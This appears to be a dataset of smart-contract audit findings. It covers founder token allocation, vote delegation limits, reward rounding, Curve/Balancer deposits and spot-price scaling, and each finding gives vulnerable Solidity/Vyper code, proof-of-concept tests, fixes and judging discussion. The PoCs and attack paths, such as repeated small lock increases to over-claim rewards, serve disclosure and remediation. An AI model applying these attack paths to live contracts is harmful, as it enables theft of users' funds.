tokenRecipient[baseTokenId];\n\n            return false;\n        }\n    }\n```\n\nPOC\nThe following test demonstrates that `tokenRecipient[200]` is for founder.\nneed change tokenRecipient to public , so can assertEq\n```\ncontract TokenStorageV1 is TokenTypesV1 {\n    /// @notice The token settings\n    Settings internal settings;\n\n    /// @notice The vesting details of a founder\n    /// @dev Founder id => Founder\n    mapping(uint256 => Founder) internal founder;\n\n    /// @notice The recipient of a token\n    /// @dev ERC// Remove the line below\n721 token id => Founder\n// Remove the line below\n   mapping(uint256 => Founder) internal tokenRecipient;\n// Add the line below\n   mapping(uint256 => Founder) public tokenRecipient;\n}\n```\n\n```\n    function test_lossFirst(address _minter, uint256 _reservedUntilTokenId, uint256 _tokenId) public {\n        deployAltMock(200);\n        (address wallet ,,)= token.tokenRecipient(200);\n        assertEq(wallet,founder);\n    }\n```\nчA better is that the baseTokenId always starts from 0.\n```\n    function _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {\n// rest of code\n\n                // Used to store the base token id the founder will recieve\n// Remove the line below\n               uint256 baseTokenId = reservedUntilTokenId;\n// Add the line below\n               uint256 baseTokenId =0;\n```\n\nor\nuse `uint256 baseTokenId = reservedUntilTokenId % 100;`\n```\n    function _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {\n// rest of code\n\n                // Used to store the base token id the founder will recieve\n// Remove the line below\n               uint256 baseTokenId = reservedUntilTokenId;\n// Add the line below\n               uint256 baseTokenId = reservedUntilTokenId  % 100;\n```\n\nDiscussion\nneokry\nThis is valid and is the core issue behind #247 as well. baseTokenId should start at 0 in `addFounders`\nnevillehuang\nI initially separated the 4 findings below, but I agree, #177, #247 and #67 are only possible because of the following lines of code here, wherein `_addFounder()`, `baseTokenId` is incorrectly initialized to `reservedUntilTokenId` in `addFounders()`, which is the root cause of the issue, and once fixed, all the issues will be fixed too. There are 4 impacts mentioned by watsons.\n```\nuint256 baseTokenId = reservedUntilTokenId;\n```\n\nPrevious founders that are meant to be deleted are retained causing them to continue receiving minted NFTs --> High severity, since it is a definite loss of funds\n#247: Any `reserveTokenId` greater than 100 will cause a 1% loss of NFT for founder --> High severity, since it is a definite loss of funds for founder as long as `reservedUntilTokenId` is set greater than 100, which is not unlikely\n#177: This is essentially only an issue as `baseTokenId` is incorrectly set as `reservedUntilTokenId` but will cause a definite loss of founders NFT if performed, so keeping as duplicate\n#67: This is closely related to the above finding (177), where a new update to `reservedUntilTokenId` via `setReservedUntilTokenId` can cause over/underallocation NFTs so keeping as duplicate\nHowever, in the context of the audit period, I could also see why watsons separated these issues, so happy to hear from watsons during escalation period revolving deduplication of these issues.\nneokry\nFixed here: https://github.com/ourzora/nouns-protocol/pull/122\nnevillehuang\nHi @neokry would be helpful if you could highlight to watsons here why you think the following primary issues should be duplicated under this issue:\n#67 #177 #247\nFrom my understanding it stems from the `_addFounders()` function used in both the `initialize()` and `updateFounders()` function, in particular the following line here,\n```\nuint256 baseTokenId = reservedUntilTokenId;\n```\n\nBut it would be extremely helpful if you could provide a more detailed explanation in each finding, and show how the fix to #42 also fixes the rest of the findings.\nTo all watsons, this is my initial deduplication here, feel free to also provide me the flow state of the functions to prove that they do not have the same root cause.\nnevillehuang\nHi watsons, The core of issue #42 is that `baseTokenId` should not start with `reservedUntilTokenId` within `addFounders()`\n#67 and its duplicates I believe this issue and its duplicates are invalid as there is a misunderstanding of how founders token amount are assigned based on this comment here\nBoth #177 and #247 and its duplicates This issue hinges on the same root cause that `baseTokenId` is initialized as `reservedUntilTokenId` . However, the key difference here is that `updateFounders()` is also affected, which is a completely different function. However, I still think that this should be duplicated with #42, based on sherlock duplication rules, more specifically, see point 1.1 and 2. The only point where they cannot be considered duplicates is when the fixes are different.\nUnless a watson can prove to me that the fix implemented here by the sponsor is insufficient, I am inclined to keep all of them as duplicates except the above mentioned #67 and its duplicates.чwhen reservedUntilTokenId > 100 first funder loss 1% NFT\nCode Snippet\nTool used\nManual Review
Delegation Limitation in Voting Power Managementчmediumч"```\nfunction delegateMgCvg(uint256 _tokenId, address _to, uint96 _percentage) external onlyTokenOwner(_tokenId) {\n    require(_percentage <= 100, ""INVALID_PERCENTAGE"");\n\n    uint256 _delegateesLength = delegatedMgCvg[_tokenId].length;\n    require(_delegateesLength < maxMgDelegatees, ""TOO_MUCH_DELEGATEES"");\n\n    uint256 tokenIdsDelegated = mgCvgDelegatees[_to].length;\n    require(tokenIdsDelegated < maxTokenIdsDelegated, ""TOO_MUCH_MG_TOKEN_ID_DELEGATED"");\n```\n"ч"MgCVG Voting power delegation system is constrained by 2 hard limits, first on the number of tokens delegated to one user (maxTokenIdsDelegated = 25) and second on the number of delegatees for one token ( maxMgDelegatees = 5). Once this limit is reached for a token, the token owner cannot modify the delegation percentage to an existing delegated user. This inflexibility can prevent efficient and dynamic management of delegated voting power.\nObserve these lines :\n```\nfunction delegateMgCvg(uint256 _tokenId, address _to, uint96 _percentage) external onlyTokenOwner(_tokenId) {\n    require(_percentage <= 100, ""INVALID_PERCENTAGE"");\n\n    uint256 _delegateesLength = delegatedMgCvg[_tokenId].length;\n    require(_delegateesLength < maxMgDelegatees, ""TOO_MUCH_DELEGATEES"");\n\n    uint256 tokenIdsDelegated = mgCvgDelegatees[_to].length;\n    require(tokenIdsDelegated < maxTokenIdsDelegated, ""TOO_MUCH_MG_TOKEN_ID_DELEGATED"");\n```\n\nif either `maxMgDelegatees` or `maxTokenIdsDelegated` are reached, delegation is no longer possible. The problem is the fact that this function can be either used to delegate or to update percentage of delegation or also to remove a delegation but in cases where we already delegated to a maximum of users (maxMgDelegatees) OR the user to who we delegated has reached the maximum number of tokens that can be delegated to him/her (maxTokenIdsDelegated), an update or a removal of delegation is no longer possible.\n6 scenarios are possible :\n`maxTokenIdsDelegated` is set to 5, Alice is the third to delegate her voting power to Bob and choose to delegate 10% to him. Bob gets 2 other people delegating their tokens to him, Alice wants to increase the power delegated to Bob to 50% but she cannot due to Bob reaching `maxTokenIdsDelegated`\n`maxTokenIdsDelegated` is set to 25, Alice is the 10th to delegate her voting power to Bob and choose to delegate 10%, DAO decrease `maxTokenIdsDelegated` to 3, Alice wants to increase the power delegated to Bob to 50%, but she cannot due to this\n`maxTokenIdsDelegated` is set to 5, Alice is the third to delegate her voting power to Bob and choose to delegate 90%. Bob gets 2 other people delegating their tokens to him, Alice wants to only remove the power delegated to Bob using this function, but she cannot due to this\n`maxMgDelegatees` is set to 3, Alice delegates her voting power to Bob,Charly and Donald by 20% each, Alice reaches `maxMgDelegatees` and she cannot update her voting power for any of Bob,Charly or Donald\n`maxMgDelegatees` is set to 5, Alice delegates her voting power to Bob,Charly and Donald by 20% each,DAO decreasesmaxMgDelegatees to 3. Alice cannot update or remove her voting power delegated to any of Bob,Charly and Donald\n`maxMgDelegatees` is set to 3, Alice delegates her voting power to Bob,Charly and Donald by 20% each, Alice wants to only remove her delegation to Bob but she reached `maxMgDelegatees` so she cannot only remove her delegation to Bob\nA function is provided to remove all user to who we delegated but this function cannot be used as a solution to this problem due to 2 things :\nIt's clearly not intended to do an update of voting power percentage by first removing all delegation we did because `delegateMgCvg()` is clearly defined to allow to delegate OR to remove one delegation OR to update percentage of delegation but in some cases it's impossible which is not acceptable\nif Alice wants to update it's percentage delegated to Bob , she would have to remove all her delegatees and would take the risk that someone is faster than her and delegate to Bob before her, making Bob reaches `maxTokenIdsDelegated` and would render impossible for Alice to re-delegate to Bob\nPOC\nYou can add it to test/ut/delegation/balance-delegation.spec.ts :\n```\nit(""maxTokenIdsDelegated is reached => Cannot update percentage of delegate"", async function () {\n        (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(25);\n        await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(3);\n        (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(3);\n\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 20);\n        await lockingPositionDelegate.connect(user2).delegateMgCvg(2, user10, 30);\n        await lockingPositionDelegate.connect(user3).delegateMgCvg(3, user10, 30);\n        \n        const txFail = lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 40);\n        await expect(txFail).to.be.revertedWith(""TOO_MUCH_MG_TOKEN_ID_DELEGATED"");\n    });\n    it(""maxTokenIdsDelegated IS DECREASED => PERCENTAGE UPDATE IS NO LONGER POSSIBLE"", async function () {\n        await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(25);\n        (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(25);\n\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 20);\n        await lockingPositionDelegate.connect(user2).delegateMgCvg(2, user10, 30);\n        await lockingPositionDelegate.connect(user3).delegateMgCvg(3, user10, 30);\n\n        await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(3);\n        (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(3);        \n\n        const txFail = lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 40);\n        await expect(txFail).to.be.revertedWith(""TOO_MUCH_MG_TOKEN_ID_DELEGATED"");\n        await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(25);\n        (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(25);\n    });\n    it(""maxMgDelegatees : TRY TO UPDATE PERCENTAGE DELEGATED TO A USER IF WE ALREADY REACH maxMgDelegatees"", async function () {\n        await lockingPositionDelegate.connect(treasuryDao).setMaxMgDelegatees(3);\n        (await lockingPositionDelegate.maxMgDelegatees()).should.be.equal(3);\n\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 20);\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user2, 30);\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user3, 30);\n\n        const txFail = lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 40);\n        await expect(txFail).to.be.revertedWith(""TOO_MUCH_DELEGATEES"");\n    });\n    it(""maxMgDelegatees : maxMgDelegatees IS DECREASED => PERCENTAGE UPDATE IS NO LONGER POSSIBLE"", async function () {\n        await lockingPositionDelegate.connect(treasuryDao).setMaxMgDelegatees(5);\n        (await lockingPositionDelegate.maxMgDelegatees()).should.be.equal(5);\n\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 20);\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user2, 30);\n        await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user3, 10);\n\n        await lockingPositionDelegate.connect(treasuryDao).setMaxMgDelegatees(2);\n        (await lockingPositionDelegate.maxMgDelegatees()).should.be.equal(2);\n\n        const txFail2 = lockingPositionDelegate.connect(user1).delegateMgCvg(1, user2, 50);\n        await expect(txFail2).to.be.revertedWith(""TOO_MUCH_DELEGATEES"");\n    });\n```\n"ч
Division difference can result in a revert when claiming treasury yield and excess rewards to some usersчmediumч```\n        uint256 cvgLockAmount = (amount * ysPercentage) / MAX_PERCENTAGE;\n        uint256 ysTotal = (lockDuration * cvgLockAmount) / MAX_LOCK;\n```\nчDifferent ordering of calculations are used to compute `ysTotal` in different situations. This causes the totalShares tracked to be less than the claimable amount of shares\n`ysTotal` is calculated differently when adding to `totalSuppliesTracking` and when computing `balanceOfYsCvgAt`. When adding to `totalSuppliesTracking`, the calculation of `ysTotal` is as follows:\n```\n        uint256 cvgLockAmount = (amount * ysPercentage) / MAX_PERCENTAGE;\n        uint256 ysTotal = (lockDuration * cvgLockAmount) / MAX_LOCK;\n```\n\nIn `balanceOfYsCvgAt`, `ysTotal` is calculated as follows\n```\n        uint256 ysTotal = (((endCycle - startCycle) * amount * ysPercentage) / MAX_PERCENTAGE) / MAX_LOCK;\n```\n\nThis difference allows the `balanceOfYsCvgAt` to be greater than what is added to `totalSuppliesTracking`\nPOC\n```\n  startCycle 357\n  endCycle 420\n  lockDuration 63\n  amount 2\n  ysPercentage 80\n```\n\nCalculation in `totalSuppliesTracking` gives:\n```\n        uint256 cvgLockAmount = (2 * 80) / 100; == 1\n        uint256 ysTotal = (63 * 1) / 96; == 0\n```\n\nCalculation in `balanceOfYsCvgAt` gives:\n```\n        uint256 ysTotal = ((63 * 2 * 80) / 100) / 96; == 10080 / 100 / 96 == 1\n```\n\nExample Scenario\nAlice, Bob and Jake locks cvg for 1 TDE and obtains rounded up `balanceOfYsCvgAt`. A user who is aware of this issue can exploit this issue further by using `increaseLockAmount` with small amount values by which the total difference difference b/w the user's calculated `balanceOfYsCvgAt` and the accounted amount in `totalSuppliesTracking` can be increased. Bob and Jake claims the reward at the end of reward cycle. When Alice attempts to claim rewards, it reverts since there is not enough reward to be sent.чPerform the same calculation in both places\n```\n+++                     uint256 _ysTotal = (_extension.endCycle - _extension.cycleId)* ((_extension.cvgLocked * _lockingPosition.ysPercentage) / MAX_PERCENTAGE) / MAX_LOCK;\n---     uint256 ysTotal = (((endCycle - startCycle) * amount * ysPercentage) / MAX_PERCENTAGE) / MAX_LOCK;\n```\n\nDiscussion\nwalk-on-me\nHello\nIndeed this is a real problem due the way that the invariant : Sum of all balanceOfYsCvg > totalSupply\nAnd so some positions will become not claimable on the `YsDistributor`.\nWe'll correct this by computing the same way the ysTotal & ysPartial on the balanceYs & ysCheckpoint\nVery nice finding, it'd break the claim for the last users to claim.\ndeadrosesxyz\nEscalate The amounts are scaled up by 1e18. The rounding down problem comes when dividing by `MAX_PERCENTAGE` which equals 100. Worst case scenario (which will only happen if a user deposits an amount which is not divisible by 100), there will be rounding down of up to 99 wei. Not only it is insignificant, it is unlikely to happen as it requires a deposit of an amount not divisible by 1e2. Believe issue should be marked as low.\nsherlock-admin2\nEscalate The amounts are scaled up by 1e18. The rounding down problem comes when dividing by `MAX_PERCENTAGE` which equals 100. Worst case scenario (which will only happen if a user deposits an amount which is not divisible by 100), there will be rounding down of up to 99 wei. Not only it is insignificant, it is unlikely to happen as it requires a deposit of an amount not divisible by 1e2. Believe issue should be marked as low.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n10xhash\nThe rounding down is significant because it disallows the last claimers of a TDE cycle from obtaining their reward.\nAn attacker can perform the attack which requires no expectations from the other users.\nThe reasoning to classify non 1e2 amounts as unlikely would be the neatness part and the UI interacting users. There is a functionality provided by the CvgUtilities contract itself to lock Cvg using swap and bond tokens which shouldn't be discriminating non 1e2 amounts.\ndeadrosesxyz\nWorst case scenario, only the last user will be unable to claim their rewards (even though I described above why it is highly unlikely). In the rare situation it happens, it can be fixed by simply sending a few wei to the contract.\nnevillehuang\nImo, just off point 1 alone, this warrants medium severity at the least. The fact that a donation is required to fix this means there is a bug, and is not intended functionality of the function.\nCzar102\nI agree that this is a borderline low/med. I don't see a reason to discriminate nonzero deposits mod 100. That said, I am siding with the escalation – the loss here is insufficient to consider it a material loss of funds (at no point in the lifetime of the codebase will it surpass $1), and a loss of protocol functionality isn't serious enough if simply sending some dust to the contract will resolve the issue.\nPlanning to accept the escalation and consider this a low severity issue.\nCergyK\n@Czar102 please consider report #132 which I submitted which allows to steal an arbitrary amount from the rewards under some conditions, which is a higher impact.\nMy issue shares the same root cause as this one, so I did not escalate for deduplication. However if you think that this issue should be low, maybe it would be more fair to make my issue unique since the impact is sufficient.\nnevillehuang\n#132 and this #190 shares the same impact, if this is invalid, #132 should be invalid as well. Namely the following two impact:\nLast user withdrawals can revert\nSome users will gain more rewards at the expense of others.\nBoth examples present used involve relatively low amounts, so I'm unsure what is the exact impact\nComparing this issue attack path\nby using increaseLockAmount with small amount values by which the total difference difference b/w the user's calculated balanceOfYsCvgAt and the accounted amount in totalSuppliesTracking can be increased\nand #132\n-> Alice locks some small amount for lockDuration = 64 so that it increases totalSupply by exactly 1 -> Alice proceeds to lock X times using the values:\nComparing this issue impact\nThis breaks the shares accounting of the treasury rewards. Some user's will get more than the actual intended rewards while the last withdrawals will result in a revert\nand #132\nUnder specific circumstances (if the attacker is the only one to have allocated to YS during a TDE), an attacker is able to claim arbitrarily more rewards than is due to him, stealing rewards from other participants in the protocol\nMy opinion is both issues should remain valid medium severity issue based on impact highlighted in both issues.\nCergyK\nAfter some discussion with @nevillehuang, agree that issues should stay duplicated and valid `high/medium` given following reasons:\nHighest impact is: loss of arbitrary amount of present/future rewards (see #132 for explanation)\nNecessary condition of very low YS allocation is unlikely but not impossible since YS is not central in Convergence (YS allocation could be empty and the system would be working as expected)\ndeadrosesxyz\nTo summarize:\nAlmost certainly in regular conditions, there will be no issue for any user whatsover.\nIn some rare case, (see original escalation) there could be a small overdistribution of rewards (matter of a few wei). In the rarer case all users claim their rewards, the last unstaker will be unable to do so due to lack of funds. This is even more unlikely considering any time a user claims rewards, the amount they claim is rounded down, (due to built-in round down in solidity) leading to making the overdistribution smaller/inexistent. But even if all the conditions are met, the issue can be fixed by simply sending a few wei to the contract.\nThe highest impact described in #132 requires for the total balance to not simply be very low but in fact to be just a few wei. Not only it has to be a few wei, but it has to be a few wei for at least 12 weeks (until TDE payout). It is absolutely unrealistic to have a few wei total balance for 12 weeks.\nIssue should remain Low severity\n10xhash\nI agree that the fix of sending minor amounts of all reward tokens won't cost the team any considerable loss financially. But apart from the fix, the impact under reasonable conditions of user not being able to withdraw their rewards is certainly a major one. If issues existing on the contract are judged based on the ease of fixing/preventing, I think a lot more issues would exist under this category. Wouldn't it make almost all functionality breaks in up-gradable contracts low severity due to the fix being an upgrade?\nCzar102\nDue to the additional impact noted (thank you @CergyK) I think the loss can be sufficient to warrant a medium severity for this issue (loss of funds, but improbable assumptions are made).\nCzar102\nResult: Medium Has duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\ndeadrosesxyz: acceptedчThis breaks the shares accounting of the treasury rewards. Some user's will get more than the actual intended rewards while the last withdrawals will result in a revert\nCode Snippet\n`totalSuppliesTracking` calculation\nTool used\nManual Review
Fewer than expected LP tokens if the pool is imbalanced during vault restorationчhighч```\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:\n..SNIP..\n    if token_supply > 0:\n        # Only account for fees if we are not the first to deposit\n        fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))\n        admin_fee: uint256 = self.admin_fee\n        for i in range(N_COINS):\n            ideal_balance: uint256 = D1 * old_balances[i] / D0\n            difference: uint256 = 0\n            if ideal_balance > new_balances[i]:\n                difference = ideal_balance - new_balances[i]\n            else:\n                difference = new_balances[i] - ideal_balance\n            fees[i] = fee * difference / FEE_DENOMINATOR\n            if admin_fee != 0:\n                self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR\n            new_balances[i] -= fees[i]\n        D2 = self.get_D(new_balances, amp)\n        mint_amount = token_supply * (D2 - D0) / D0\n    else:\n        mint_amount = D1  # Take the dust if there was any\n..SNIP..\n```\nчThe vault restoration function intends to perform a proportional deposit. If the pool is imbalanced due to unexpected circumstances, performing a proportional deposit is not optimal. This results in fewer pool tokens in return due to sub-optimal trade, eventually leading to a loss for the vault shareholder.\nPer the comment on Line 498, it was understood that the `restoreVault` function intends to deposit the withdrawn tokens back into the pool proportionally.\nThe main reason to join with all the pool's tokens in exact proportions is to minimize the price impact or slippage of the join. If the deposited tokens are imbalanced, they are often swapped internally within the pool, incurring slippage or fees.\nHowever, the concept of proportional join to minimize slippage does not always hold with the current implementation of the `restoreVault` function.\nProof-of-Concept\nAt T0, assume that a pool is perfectly balanced (50%-50%) with 1000 WETH and 1000 stETH.\nAt T1, an emergency exit is performed, the LP tokens are redeemed for the underlying pool tokens proportionally, and 100 WETH and 100 stETH are redeemed\nAt T2, certain events happen or due to ongoing issues with the pool (e.g., attacks, bugs, mass withdrawal), the pool becomes imbalanced (30%-70%) with 540 WETH and 1260 stETH.\nAt T3, the vault re-enters the withdrawn tokens to the pool proportionally with 100 WETH and 100 stETH. Since the pool is already imbalanced, attempting to enter the pool proportionally (50% WETH and 50% stETH) will incur additional slippage and penalties, resulting in fewer LP tokens returned.\nThis issue affects both Curve and Balancer pools since joining an imbalanced pool will always incur a loss.\nExplantation of imbalance pool\nA Curve pool is considered imbalanced when there is an imbalance between the assets within it. For instance, the Curve stETH/ETH pool is considered imbalanced if it has the following reserves:\nETH: 340,472.34 (31.70%)\nstETH: 733,655.65 (68.30%)\nIf a Curve Pool is imbalanced, attempting to perform a proportional join will not give an optimal return (e.g. result in fewer Pool LP tokens received).\nIn Curve Pool, there are penalties/bonuses when depositing to a pool. The pools are always trying to balance themselves. If a deposit helps the pool to reach that desired balance, a deposit bonus will be given (receive extra tokens). On the other hand, if a deposit deviates from the pool from the desired balance, a deposit penalty will be applied (receive fewer tokens).\nThe following is the source code of `add_liquidity` function taken from https://github.com/curvefi/curve-contract/blob/master/contracts/pools/steth/StableSwapSTETH.vy. As shown below, the function attempts to calculate the `difference` between the `ideal_balance` and `new_balances`, and uses the `difference` as a factor of the fee computation, which is tied to the bonus and penalty.\n```\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:\n..SNIP..\n    if token_supply > 0:\n        # Only account for fees if we are not the first to deposit\n        fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))\n        admin_fee: uint256 = self.admin_fee\n        for i in range(N_COINS):\n            ideal_balance: uint256 = D1 * old_balances[i] / D0\n            difference: uint256 = 0\n            if ideal_balance > new_balances[i]:\n                difference = ideal_balance - new_balances[i]\n            else:\n                difference = new_balances[i] - ideal_balance\n            fees[i] = fee * difference / FEE_DENOMINATOR\n            if admin_fee != 0:\n                self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR\n            new_balances[i] -= fees[i]\n        D2 = self.get_D(new_balances, amp)\n        mint_amount = token_supply * (D2 - D0) / D0\n    else:\n        mint_amount = D1  # Take the dust if there was any\n..SNIP..\n```\n\nFollowing is the mathematical explanation of the penalties/bonuses extracted from Curve's Discord channel:\nThere is a “natural” amount of D increase that corresponds to a given total deposit amount; when the pool is perfectly balanced, this D increase is optimally achieved by a balanced deposit. Any other deposit proportions for the same total amount will give you less D.\nHowever, when the pool is imbalanced, a balanced deposit is no longer optimal for the D increase.ч"
Rounding differences when computing the invariantчhighч```\nfunction _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n    internal\n    pure\n    returns (uint256)\n{\n    /**********************************************************************************************\n    // invariant                                                                                 //\n    // D = invariant                                                  D^(n+1)                    //\n    // A = amplification coefficient      A  n^n S + D = A D n^n + -----------                   //\n    // S = sum of balances                                             n^n P                     //\n    // P = product of balances                                                                   //\n    // n = number of tokens                                                                      //\n    **********************************************************************************************/\n\n    // Always round down, to match Vyper's arithmetic (which always truncates).\n    ..SNIP..\n```\nчThe invariant is used to compute the spot price to verify if the pool has been manipulated before executing certain key vault actions (e.g. reinvest rewards). If the inputted invariant is inaccurate, the spot price computed might not be accurate and might not match the actual spot price of the Balancer Pool. In the worst-case scenario, it might potentially fail to detect the pool has been manipulated, and the trade proceeds to execute against the manipulated pool, leading to a loss of assets.\nThe Balancer's Composable Pool codebase relies on the old version of the `StableMath._calculateInvariant` that allows the caller to specify if the computation should round up or down via the `roundUp` parameter.\nWithin the `BalancerSpotPrice._calculateStableMathSpotPrice` function, the `StableMath._calculateInvariant` is computed rounding up per Line 90 below\nhttps://arbiscan.io/address/0xade4a71bb62bec25154cfc7e6ff49a513b491e81#code#F28#L57 (Balancer rETH-WETH Stable Pool - Arbitrum)\n```\nfunction _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n    internal\n    pure\n    returns (uint256)\n{\n    /**********************************************************************************************\n    // invariant                                                                                 //\n    // D = invariant                                                  D^(n+1)                    //\n    // A = amplification coefficient      A  n^n S + D = A D n^n + -----------                   //\n    // S = sum of balances                                             n^n P                     //\n    // P = product of balances                                                                   //\n    // n = number of tokens                                                                      //\n    **********************************************************************************************/\n\n    // Always round down, to match Vyper's arithmetic (which always truncates).\n    ..SNIP..\n```\n\nThus, Notional rounds up when calculating the invariant, while Balancer's Composable Pool rounds down when calculating the invariant. This inconsistency will result in a different invariantчTo avoid any discrepancy in the result, ensure that the StableMath library used by Balancer's Composable Pool and Notional's leverage vault are aligned, and the implementation of the StableMath functions is the same between them.\nDiscussion\njeffywu\nValid issue\njeffywu\nTo some extent this is a duplicate of #83 which is a more complete description of the problem, but will leave that to the judges. It appears that Balancer has tweaked their `_calculateInvariant` implementation in the ComposableStablePool rewrite which included this rounding difference as well as other differences.\njeffywu\nhttps://github.com/notional-finance/leveraged-vaults/pull/63чHigh, as per past contest's risk rating - https://github.com/sherlock-audit/2022-12-notional-judging/issues/17\nThe invariant is used to compute the spot price to verify if the pool has been manipulated before executing certain key vault actions (e.g. reinvest rewards). If the inputted invariant is inaccurate, the spot price computed might not be accurate and might not match the actual spot price of the Balancer Pool. In the worst-case scenario, it might potentially fail to detect the pool has been manipulated, and the trade proceeds to execute against the manipulated pool, leading to a loss of assets.\nCode Snippet\nTool used\nManual Review
Incorrect scaling of the spot priceчhighч```\nscaledPrimary = balances[USDC] * scalingFactors[USDC] / BALANCER_PRECISION\nscaledPrimary = 100 * 1e6 * 1e30 / 1e18\nscaledPrimary = 100 * 1e18\n\nscaledSecondary = balances[DAI] * scalingFactors[DAI] / BALANCER_PRECISION\nscaledSecondary = 100 * 1e18 * 1e18 / 1e18\nscaledSecondary = 100 * 1e18\n```\nчThe incorrect scaling of the spot price leads to the incorrect spot price, which is later compared with the oracle price.\nIf the spot price is incorrect, it might potentially fail to detect the pool has been manipulated or result in unintended reverts due to false positives. In the worst-case scenario, the trade proceeds to execute against the manipulated pool, leading to a loss of assets.\nPer the comment and source code at Lines 97 to 103, the `SPOT_PRICE.getComposableSpotPrices` is expected to return the spot price in native decimals.\nWithin the `getComposableSpotPrices` function, it will trigger the `_calculateStableMathSpotPrice` function. When the primary and secondary balances are passed into the `StableMath._calculateInvariant` and `StableMath._calcSpotPrice` functions, they are scaled up to 18 decimals precision as StableMath functions only work with balances that have been normalized to 18 decimals.\nAssuming that the following states:\nPrimary Token = USDC (6 decimals)\nSecondary Token = DAI (18 decimals)\nPrimary Balance = 100 USDC (=100 * 1e6)\nSecondary Balance = 100 DAI (=100 * 1e18)\nscalingFactors[USDC] = 1e12 * Fixed.ONE (1e18) = 1e30\nscalingFactors[DAI] = 1e0 * Fixed.ONE (1e18) = 1e18\nThe price between USDC and DAI is 1:1\nAfter scaling the primary and secondary balances, the scaled balances will be as follows:\n```\nscaledPrimary = balances[USDC] * scalingFactors[USDC] / BALANCER_PRECISION\nscaledPrimary = 100 * 1e6 * 1e30 / 1e18\nscaledPrimary = 100 * 1e18\n\nscaledSecondary = balances[DAI] * scalingFactors[DAI] / BALANCER_PRECISION\nscaledSecondary = 100 * 1e18 * 1e18 / 1e18\nscaledSecondary = 100 * 1e18\n```\n\nThe spot price returned from the `StableMath._calcSpotPrice` function at Line 93 will be `1e18` (1:1).\nSubsequently, in Line 96 above, the code attempts to remove the scaling factor from the spot price (1e18).\n```\nspotPrice = spotPrice * scalingFactors[USDC] / scalingFactors[DAI];\nspotPrice = 1e18 * 1e30 / 1e18\nspotPrice = 1e30\nspotPrice = 1e12 * 1e18\n```\n\nThe `spotPrice[DAI-Secondary]` is not denominated in native precision after the scaling. The `SPOT_PRICE.getComposableSpotPrices` will return the following spot prices:\n```\nspotPrice[USDC-Primary] = 0\nspotPrice[DAI-Secondary] = 1e12 * 1e18\n```\n\nThe returned spot prices will be scaled to POOL_PRECISION (1e18). After the scaling, the spot price remains the same:\n```\nspotPrice[DAI-Secondary] = spotPrice[DAI-Secondary] * POOL_PRECISION / DAI_Decimal\nspotPrice[DAI-Secondary] = 1e12 * 1e18 * 1e18 / 1e18\nspotPrice[DAI-Secondary] = 1e12 * 1e18\n```\n\nThe converted spot prices will be passed into the `_calculateLPTokenValue` function. Within the `_calculateLPTokenValue` function, the oracle price for DAI<>USDC will be `1e18`. From here, the `spotPrice[DAI-Secondary]` (1e12 * 1e18) is significantly different from the oracle price (1e18), which will cause the pool manipulation check to revert.чThe spot price returned from `StableMath._calcSpotPrice` is denominated in 1e18 (POOL_PRECISION) since the inputted balances are normalized to 18 decimals. The scaling factors are used to normalize a balance to 18 decimals. By dividing or scaling down the spot price by the scaling factor, the native spot price will be returned.\n```\nspotPrice[DAI-Secondary] = spotPrice[DAI-Secondary] * Fixed.ONE / scalingFactors[DAI];\nspotPrice = 1e18 * Fixed.ONE / (1e0 * Fixed.ONE)\nspotPrice = 1e18 * 1e18 / (1e0 * 1e18)\nspotPrice = 1e18\n```\n\nDiscussion\njeffywu\nValid issue\njeffywu\nhttps://github.com/notional-finance/leveraged-vaults/pull/63чThe spot price is used to verify if the pool has been manipulated before executing certain key vault actions (e.g. reinvest rewards).\nIf the spot price is incorrect, it might potentially result in the following:\nFailure to detect the pool has been manipulated, resulting in the trade to execute against the manipulated pool, leading to a loss of assets.\nUnintended reverts due to false positives, breaking core functionalities of the protocol that rely on the `_checkPriceAndCalculateValue` function.\nThe affected `_checkPriceAndCalculateValue` function was found to be used within the following functions:\n`reinvestReward` - If the `_checkPriceAndCalculateValue` function is malfunctioning or reverts unexpectedly, the protocol will not be able to reinvest, leading to a loss of value for the vault shareholders.\n`convertStrategyToUnderlying` - This function is used by Notional V3 for the purpose of computing the collateral values and the account's health factor. If the `_checkPriceAndCalculateValue` function reverts unexpectedly due to an incorrect invariant/spot price, many of Notional's core functions will break. In addition, the collateral values and the account's health factor might be inflated if it fails to detect a manipulated pool due to incorrect invariant/spot price, potentially allowing the malicious actors to drain the main protocol.\nCode Snippet\nTool used\nManual Review
